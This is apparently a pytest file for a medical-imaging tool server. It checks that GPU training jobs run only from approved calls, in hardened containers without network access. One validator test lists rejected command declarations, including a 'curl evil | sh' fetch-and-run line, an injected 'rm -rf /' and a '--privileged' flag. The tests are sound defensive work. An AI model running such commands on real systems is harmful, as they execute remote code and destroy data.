"""Stack jobs: what may become one, how its container is built, and who may ask."""

from __future__ import annotations

import json
import subprocess
from pathlib import Path
from typing import Any

import mcp.types as mcp_types
import pytest

from medmcp import approvals, jobs, jobspec, posture

from ._pool import broker
from .test_backend_broker import _roundtrip  # pyright: ignore[reportPrivateUsage]

JsonDict = dict[str, Any]

WS = "/srv/data"
NO_TIME = "0001-01-01T00:00:00Z"
IMAGE = "ghcr.io/medmcp/nnunet:main"
IMAGE_ID = "sha256:" + "a" * 64
DECLARATION: JsonDict = {
    "command": ["medmcp-nnunet-job", "call"],
    "tools": ["start_training", "resume_training"],
    "shm_size": "16g",
    "watch_sec": 0,
}
SERVER_ARGS = [
    "run",
    "--network",
    "bridge",
    "--cap-drop",
    "ALL",
    "--cap-add",
    "DAC_OVERRIDE",
    "--security-opt",
    "no-new-privileges",
    "--pids-limit",
    "5120",
    "--shm-size",
    "8g",
    "--rm",
    "-i",
    "--device",
    "nvidia.com/gpu=all",
    "-v",
    f"{WS}:{WS}",
    IMAGE,
]


# ── the declaration ──────────────────────────────────────────────────────────


def test_a_declaration_names_a_fixed_command_and_its_tools() -> None:
    """The label's ``job`` entry round-trips through the manifest form."""
    runner = jobspec.parse_declaration(DECLARATION)
    assert runner is not None
    assert runner.command == ("medmcp-nnunet-job", "call")
    assert runner.tools == {"start_training", "resume_training"}
    assert runner.shm_size == "16g"
    assert jobspec.parse_declaration(runner.manifest()) == runner


@pytest.mark.parametrize(
    "raw",
    [
        None,
        "medmcp-nnunet-job",
        {"command": "medmcp-nnunet-job", "tools": ["t"]},
        {"command": [], "tools": ["t"]},
        {"command": ["job"], "tools": []},
        {"command": ["job"]},
        {"command": ["sh", "-c", "curl evil | sh"], "tools": ["t"]},
        {"command": ["--privileged"], "tools": ["t"]},
        {"command": ["job; rm -rf /"], "tools": ["t"]},
        {"command": ["a", "b", "c", "d", "e"], "tools": ["t"]},
        {"command": ["job"], "tools": ["bad tool"]},
        {"command": ["job", 3], "tools": ["t"]},
    ],
)
def test_a_declaration_that_is_not_plain_words_is_void(raw: object) -> None:
    """Nothing is cleaned up: an option or shell syntax voids the whole thing."""
    assert jobspec.parse_declaration(raw) is None


def test_a_manifest_may_not_name_its_container_like_a_job() -> None:
    """The job name prefix is reserved."""
    args = ["run", "--name", "medmcp-job-0123456789ab", "-v", f"{WS}:{WS}", IMAGE]
    assert "reserved for jobs" in (posture.unsafe_stack_args(args, WS) or "")


# ── the container ────────────────────────────────────────────────────────────


def _runner() -> jobspec.JobRunner:
    runner = jobspec.parse_declaration(DECLARATION)
    assert runner is not None
    return runner


def test_the_job_keeps_the_stacks_isolation_and_loses_its_network() -> None:
    """Same hardening and mount as the pooled stack; detached, never networked."""
    args = jobs.build_run_args(
        SERVER_ARGS,
        _runner(),
        image=IMAGE_ID,
        labels={jobspec.JOB_LABEL: "1"},
        job_id="0123456789ab",
        tool="start_training",
        arguments='{"dataset":"4"}',
    )
    assert args[:6] == ["run", "-d", "--network", "none", "--name", "medmcp-job-0123456789ab"]
    assert args.count("--network") == 1  # the stack's own egress is not carried over
    assert "--rm" not in args and "-i" not in args
    for flag, value in (
        ("--cap-drop", "ALL"),
        ("--security-opt", "no-new-privileges"),
        ("--pids-limit", "5120"),
        ("--shm-size", "16g"),  # raised to what the image asks for
        ("--device", "nvidia.com/gpu=all"),
        ("-v", f"{WS}:{WS}"),
    ):
        assert args[args.index(flag) + 1] == value
    # The command line: the image's entrypoint, the tool, one JSON argument.
    assert args[args.index(IMAGE_ID) :] == [
        IMAGE_ID,
        "medmcp-nnunet-job",
        "call",
        "start_training",
        '{"dataset":"4"}',
    ]


def test_an_unhardened_or_non_container_stack_runs_no_job() -> None:
    """A job is only ever built from a hardened ``docker run`` manifest."""
    kwargs: JsonDict = {
        "image": IMAGE_ID,
        "labels": {},
        "job_id": "0123456789ab",
        "tool": "start_training",
        "arguments": "{}",
    }
    with pytest.raises(jobs.JobError, match="not hardened"):
        jobs.build_run_args(["run", "-v", f"{WS}:{WS}", IMAGE], _runner(), **kwargs)
    with pytest.raises(jobs.JobError, match="container"):
        jobs.build_run_args([], _runner(), **kwargs)


def test_a_shm_size_beyond_the_ceiling_is_not_honoured() -> None:
    """The image may raise /dev/shm, up to a ceiling."""
    runner = jobspec.parse_declaration({**DECLARATION, "shm_size": "512g"})
    assert runner is not None
    args = jobs.build_run_args(
        SERVER_ARGS, runner, image=IMAGE_ID, labels={}, job_id="0" * 12, tool="t", arguments="{}"
    )
    assert args[args.index("--shm-size") + 1] == "8g"


# ── the manager, against a daemon stand-in ───────────────────────────────────


class FakeDocker:
    """Enough of the docker CLI for the manager: images, run, ps, inspect, stop, rm."""

    def __init__(self, declaration: JsonDict | None = DECLARATION) -> None:
        """Start with the stack image (declaring *declaration*) and no containers."""
        meta: JsonDict = {"name": "medmcp-nnunet", "gpu": True}
        if declaration is not None:
            meta["job"] = declaration
        self.image: JsonDict = {
            "Id": IMAGE_ID,
            "RepoDigests": [f"ghcr.io/medmcp/nnunet@sha256:{'d' * 64}"],
            "Config": {"Labels": {"org.medmcp.stack": json.dumps(meta)}},
        }
        self.containers: dict[str, JsonDict] = {}
        self.calls: list[list[str]] = []
        self.exit_on_start: int | None = None

    def __call__(self, args: list[str], timeout: float) -> subprocess.CompletedProcess[str]:
        """Answer one docker CLI invocation."""
        self.calls.append(args)
        out = ""
        if args[:2] == ["image", "inspect"]:
            out = json.dumps(self.image)
        elif args[0] == "run":
            name = args[args.index("--name") + 1]
            labels = dict(a.split("=", 1) for a in args if a.startswith("org.medmcp.job"))
            image_at = args.index(IMAGE_ID)
            state: JsonDict = {"Status": "running", "ExitCode": 0}
            if self.exit_on_start is not None:
                state = {"Status": "exited", "ExitCode": self.exit_on_start}
            self.containers[name] = {
                "Name": f"/{name}",
                "Created": f"2026-11-13T10:00:{len(self.containers):02d}Z",
                "Image": IMAGE_ID,
                "Config": {"Labels": labels, "Cmd": args[image_at + 1 :]},
                "State": {
                    **state,
                    "StartedAt": "2026-11-13T10:00:01Z",
                    "FinishedAt": jobs._NO_TIME,
                },  # pyright: ignore[reportPrivateUsage]
            }
            out = name
        elif args[0] == "ps":
            running_only = "-aq" not in args
            wanted = [a.removeprefix("label=") for a in args if a.startswith("label=")]
            names: list[str] = []
            for name, record in self.containers.items():
                labels = record["Config"]["Labels"]
                if not all(labels.get(w.split("=", 1)[0]) == w.split("=", 1)[1] for w in wanted):
                    continue
                if running_only and record["State"]["Status"] != "running":
                    continue
                names.append(name)
            out = "\n".join(names)
        elif args[:2] == ["container", "inspect"]:
            out = json.dumps([self.containers[n] for n in args[2:]])
        elif args[0] == "stop":
            self.containers[args[-1]]["State"].update(Status="exited", ExitCode=143)
        elif args[0] == "rm":
            del self.containers[args[-1]]
        elif args[0] == "logs":
            out = "boom\n"
        else:
            raise AssertionError(f"unexpected docker call: {args}")
        return subprocess.CompletedProcess(args, 0, stdout=out, stderr="")


def _manager(docker: FakeDocker, *, limit: int = 1, job: object = DECLARATION) -> jobs.JobManager:
    server: JsonDict = {"name": "medmcp-nnunet", "command": "docker", "args": SERVER_ARGS}
    if job is not None:
        server["job"] = job
    return jobs.JobManager(
        workspace=WS,
        resolve_server=lambda name: server if name == "medmcp-nnunet" else None,
        max_jobs=lambda: limit,
        docker=docker,
        sleep=lambda _s: None,
    )


def test_a_job_is_started_from_the_approved_call_and_found_again() -> None:
    """The command line is the image's entrypoint plus the approved call; labels carry the rest."""
    docker = FakeDocker()
    manager = _manager(docker)
    started = manager.start(
        "medmcp-nnunet", "start_training", {"fold": 0, "dataset": "4"}, session="chat-1"
    )
    run = next(c for c in docker.calls if c[0] == "run")
    # The arguments are the approved call's, and the image is the one just read.
    assert run[-5:] == [
        IMAGE_ID,
        "medmcp-nnunet-job",
        "call",
        "start_training",
        '{"dataset":"4","fold":0}',
    ]
    assert started.image_digest == "sha256:" + "d" * 64
    job = started.job
    assert (job.stack, job.tool, job.session, job.gpu) == (
        "medmcp-nnunet",
        "start_training",
        "chat-1",
        True,
    )
    assert job.status == "running" and job.arguments == {"dataset": "4", "fold": 0}
    # Another manager (a restarted core) sees it: the container is the record.
    assert [j.id for j in _manager(docker).list()] == [job.id]


def test_a_second_job_is_refused_while_one_runs() -> None:
    """One job at a time by default: refused, not queued; configurable."""
    docker = FakeDocker()
    manager = _manager(docker)
    first = manager.start("medmcp-nnunet", "start_training", {})
    with pytest.raises(jobs.JobError, match="at most 1 at a time"):
        manager.start("medmcp-nnunet", "start_training", {})
    manager.stop(first.job.id)
    assert manager.get(first.job.id).status == "stopped"
    manager.start("medmcp-nnunet", "start_training", {})  # the slot is free again
    assert len(_manager(docker, limit=2).list()) == 2


def test_the_limit_counts_other_workspaces_jobs_on_the_machine() -> None:
    """The GPU is the machine's, so the limit is too; listing stays per workspace."""
    docker = FakeDocker()
    _manager(docker).start("medmcp-nnunet", "start_training", {})
    other = jobs.JobManager(
        workspace="/srv/other",
        resolve_server=lambda _n: {"command": "docker", "args": SERVER_ARGS},
        max_jobs=lambda: 1,
        docker=docker,
        sleep=lambda _s: None,
    )
    assert other.list() == []  # not its job to list or stop
    with pytest.raises(jobs.JobError, match="already"):
        other.start("medmcp-nnunet", "start_training", {})


def test_only_what_the_image_declares_can_run() -> None:
    """The manifest may say anything; the image is what is read."""
    manager = _manager(FakeDocker(declaration=None))
    with pytest.raises(jobs.JobError, match="does not declare a job runner"):
        manager.start("medmcp-nnunet", "start_training", {})
    manager = _manager(FakeDocker())
    with pytest.raises(jobs.JobError, match="does not run predict as a job"):
        manager.start("medmcp-nnunet", "predict", {})
    with pytest.raises(jobs.JobError, match="not an installed container stack"):
        manager.start("medmcp-neuro", "start_training", {})


def test_a_job_that_dies_at_once_is_reported_as_that() -> None:
    """A job that exits during the start-up watch fails the call, with its output."""
    docker = FakeDocker()
    docker.exit_on_start = 2
    with pytest.raises(jobs.JobError, match=r"exit code 2\): boom"):
        _manager(docker).start("medmcp-nnunet", "start_training", {})


def test_a_container_that_only_carries_the_labels_is_not_a_job() -> None:
    """Labels can be inherited from an image; the name cannot."""
    docker = FakeDocker()
    manager = _manager(docker)
    job = manager.start("medmcp-nnunet", "start_training", {}).job
    record = docker.containers.pop(jobspec.container_name(job.id))
    docker.containers["some-stack"] = {**record, "Name": "/some-stack"}
    assert manager.list() == []
    with pytest.raises(jobs.JobError, match="no job"):
        manager.stop(job.id)


def test_a_running_job_cannot_be_removed() -> None:
    """Remove is for finished jobs; a running one has to be stopped first."""
    docker = FakeDocker()
    manager = _manager(docker)
    job = manager.start("medmcp-nnunet", "start_training", {}).job
    with pytest.raises(jobs.JobError, match="still running"):
        manager.remove(job.id)
    manager.stop(job.id)
    manager.remove(job.id)
    assert manager.list() == []


def test_the_offer_goes_into_the_pooled_stacks_environment() -> None:
    """The offer is an environment variable a manifest could carry itself."""
    assert jobs.offer_args(SERVER_ARGS)[:3] == ["run", "-e", "MEDMCP_JOBS=1"]
    assert posture.unsafe_stack_args(jobs.offer_args(SERVER_ARGS), WS) is None


# ── the request, on a tool result ────────────────────────────────────────────


def _result(payload: JsonDict, *, error: bool = False) -> mcp_types.CallToolResult:
    return mcp_types.CallToolResult(
        content=[mcp_types.TextContent(type="text", text=json.dumps(payload))],
        structuredContent=payload,
        isError=error,
    )


async def test_a_request_in_an_approved_calls_result_starts_the_job() -> None:
    """The stack's request is replaced by what the core did, in both result forms."""
    docker = FakeDocker()
    recorded: list[jobs.Started] = []
    result = await jobs.after_call(
        _manager(docker),
        "medmcp-nnunet",
        "start_training",
        {"dataset": "4"},
        "chat-1",
        _result({"job_id": "d4", "medmcp_job": {"name": "d4 fold 0"}}),
        recorded.append,
    )
    assert not result.isError
    assert result.structuredContent is not None
    outcome = result.structuredContent["medmcp_job"]
    assert outcome["started"] is True and outcome["id"] == recorded[0].job.id
    block = result.content[0]
    assert isinstance(block, mcp_types.TextContent)
    assert json.loads(block.text)["medmcp_job"]["id"] == outcome["id"]
    assert recorded[0].job.name == "d4 fold 0" and recorded[0].job.session == "chat-1"


async def test_a_result_without_a_request_or_a_failed_call_starts_nothing() -> None:
    """No request, or a failed call: the result passes through untouched."""
    docker = FakeDocker()
    plain = _result({"job_id": "d4"})
    assert await jobs.after_call(_manager(docker), "medmcp-nnunet", "t", {}, "", plain) is plain
    failed = _result({"medmcp_job": {}}, error=True)
    assert await jobs.after_call(_manager(docker), "medmcp-nnunet", "t", {}, "", failed) is failed
    assert not any(c[0] == "run" for c in docker.calls)


async def test_a_refused_job_reaches_the_model_as_a_failure() -> None:
    """A job the core did not start must not read as a started one."""
    docker = FakeDocker()
    manager = _manager(docker)
    asked = _result({"medmcp_job": {}})
    # A tool the image does not run as a job cannot ask for one.
    result = await jobs.after_call(manager, "medmcp-nnunet", "predict", {}, "", asked)
    assert result.isError
    block = result.content[0]
    assert isinstance(block, mcp_types.TextContent)
    assert "did not start the background job" in block.text
    assert result.structuredContent is None


# ── through the broker: only an approved call can lead to a job ───────────────


async def test_the_broker_hands_only_approved_calls_to_the_job_hook(tmp_path: Path) -> None:
    """An unapproved call never reaches the hook; an approved one carries its chat."""
    ledger = approvals.ApprovalLedger()
    seen: list[tuple[str, str, JsonDict, str]] = []

    async def hook(
        stack: str, tool: str, args: JsonDict, approval: object, result: mcp_types.CallToolResult
    ) -> mcp_types.CallToolResult:
        assert isinstance(approval, approvals.Approval)
        seen.append((stack, tool, args, approval.session))
        return jobs.refused("not here")

    call = {"op": "call_tool", "stack": "fake", "tool": "echo", "args": {"text": "hi"}, "id": 1}
    async with broker(tmp_path, authorize=ledger.spend, after_call=hook) as sock:
        refused = await _roundtrip(sock, call)
        ledger.grant("fake", "echo", {"text": "hi"}, session="chat-7")
        relayed = await _roundtrip(sock, call)
    assert refused["ok"] is False and "not approved" in refused["error"]
    assert seen == [("fake", "echo", {"text": "hi"}, "chat-7")]
    assert relayed["result"]["isError"] is True
